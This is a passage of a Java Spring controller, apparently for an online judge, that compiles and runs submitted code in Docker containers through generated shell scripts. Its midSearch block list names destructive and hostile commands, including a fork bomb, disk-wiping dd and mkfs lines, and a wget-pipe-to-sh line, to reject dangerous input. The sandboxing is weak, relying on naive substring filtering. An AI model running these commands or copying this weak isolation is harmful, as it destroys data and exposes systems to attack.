						tmp = shellCmd("sh ./share/algoMid_c.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
					}

				} else if (lang.equals("c++")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.cpp");
					codew.write(code);
					codew.close();

					timeCheck("./algotest");
					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");
					algo_c.write("docker exec " + dockerName
							+ " sh -c 'cd data; g++ -std=c++14  algotest.cpp -o algotest 2> compileError.txt'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh");

					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";
					try {

						tmp = shellCmd("sh ./share/algoMid_c.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
					}

				} else if (lang.equals("java")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.class");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.class");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.java");
					codew.write(code);
					codew.close();

					FileWriter algo_java = new FileWriter("/usr/local/apache/share/algo_java.sh");
					algo_java.write("docker restart " + dockerName + "\n");
					algo_java.write("docker exec " + dockerName
							+ " sh -c 'export LC_ALL=C.UTF-8; cd data; javac -encoding utf-8 algotest.java 2> compileError.txt'");
					algo_java.close();
					shellCmd("sh /usr/local/apache/share/algo_java.sh");

					timeCheck("java -Dfile.encoding=utf-8 algotest");
					FileWriter algoMid_java = new FileWriter("/usr/local/apache/share/algoMid_java.sh");
					algoMid_java.write("docker restart " + dockerName + "\n");
					algoMid_java.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_java.write("docker stop " + dockerName + "\n");
					algoMid_java.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";

					try {

						tmp = shellCmd("sh ./share/algoMid_java.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
					}

				} else if (lang.equals("python")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.py");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.py");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.py");
					codew.write("# -*- coding: utf-8 -*-\n" + code);
					codew.close();

					timeCheck("python3 algotest.py 2> compileError.txt");
					FileWriter algoMid_python = new FileWriter("/usr/local/apache/share/algoMid_python.sh");
					algoMid_python.write("docker restart " + dockerName + "\n");
					algoMid_python.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_python.write("docker stop " + dockerName + "\n");
					algoMid_python.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";
					try {

						tmp = shellCmd("sh ./share/algoMid_python.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
					}

				} else if (lang.equals("javascript")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.js");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.js");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.js");
					codew.write(code);
					codew.close();

					timeCheck("js algotest.js 2> compileError.txt");
					FileWriter algoMid_js = new FileWriter("/usr/local/apache/share/algoMid_js.sh");
					algoMid_js.write("docker restart " + dockerName + "\n");
					algoMid_js.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_js.write("docker stop " + dockerName + "\n");
					algoMid_js.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";
					try {

						tmp = shellCmd("sh ./share/algoMid_js.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
					}
				}
				result = result + "<br>&nbsp;&nbsp;<span style='color:#7BC379'>>>>>>>>&nbsp;제출시간&nbsp;<<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;제출&nbsp;:&nbsp;" + today;

				result = result + "<br><br>&nbsp;&nbsp;>>>>>>>&nbsp;&nbsp;유저ID&nbsp;&nbsp;<<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;user&nbsp;:&nbsp;" + user_id;

				result = result + "<br><br>&nbsp;&nbsp;>>>>>>>&nbsp;실행시간&nbsp;<<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;time&nbsp;:&nbsp;"
						+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");

			} catch (Exception e) {
				result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>오류입니다.</span>";

			}

		}

		map.put("result", result);
		return map;

	}

	@RequestMapping(value = "/searchProblem", method = RequestMethod.POST)
	@ResponseBody
	public void searchProblem(HttpSession session, String searchInput, String searchType) throws Exception {
		session.setAttribute("searchInput", searchInput);
		session.setAttribute("searchType", searchType);
	}

	public static String shellCmd(String command) throws Exception {
		Runtime runTime = Runtime.getRuntime();
		Process process = runTime.exec(command);
		InputStream inputStream = process.getInputStream();

		InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
		BufferedReader bufferReader = new BufferedReader(inputStreamReader);

		String line;
		String result = "";
		if (bufferReader.readLine() != null) {
			while ((line = bufferReader.readLine()) != null) {
				result = result + "<br>" + line;
			}
		} else
			result = "내용 오류";

		return result;
	}

	public static String Reader(String fileName) throws IOException {
		BufferedReader bufferReader = new BufferedReader(new FileReader(fileName));
		String result = "";
		while (true) {
			String line = bufferReader.readLine();
			if (line == null)
				break;
			result = result + "<br>" + line;
		}
		bufferReader.close();
		return result;
	}

	public static void timeCheck(String tmp) {

		try {
			FileWriter timeCheck = new FileWriter("/usr/local/apache/share/timeCheck.sh");
			timeCheck.write("beginTime=$(date +%s%N)" + "\n");
			timeCheck.write(tmp + " < testinput" + "\n");
			timeCheck.write("endTime=$(date +%s%N)" + "\n");
			timeCheck.write("elapsed=`echo \"($endTime - $beginTime) / 1000000\" | bc`" + "\n");
			timeCheck.write("elapsedSec=`echo \"scale=6;$elapsed / 1000\" | bc | awk '{printf \"%.6f\", $1}'`" + "\n");
			timeCheck.write("echo $elapsedSec sec > timeCheck.txt");
			timeCheck.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public static String midSearch(String tmp) {
		String[] data = { "system(", "sudo shutdown -h 0", "sudo init 0", "sudo poweroff", "shutdown -r now",
				"shutdown", "docker restart", "docker exec", "docker stop", "docker rm", "docker rmi", "docker-compose",
				"shutdown -r", "init 0", "init 6", "halt -f", "reboot -f", "shutdown -h", "rm -rf", "rm -r", "docker",
				":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget hxxp://malicious_source -O- | sh",
				"mkfs.ext3 /dev/sda", "> file", "^foo^bar", "dd if=/dev/random of=/dev/sda" };

		int cnp = 0;
		for (int i = 0; i < data.length; i++) {
			if (tmp.contains(data[i])) {
				cnp = cnp + 1;
				break;
			}
		}

		if (cnp == 0) {
			return tmp;
		} else {
			return "불법접근입니다.";
		}

	}

}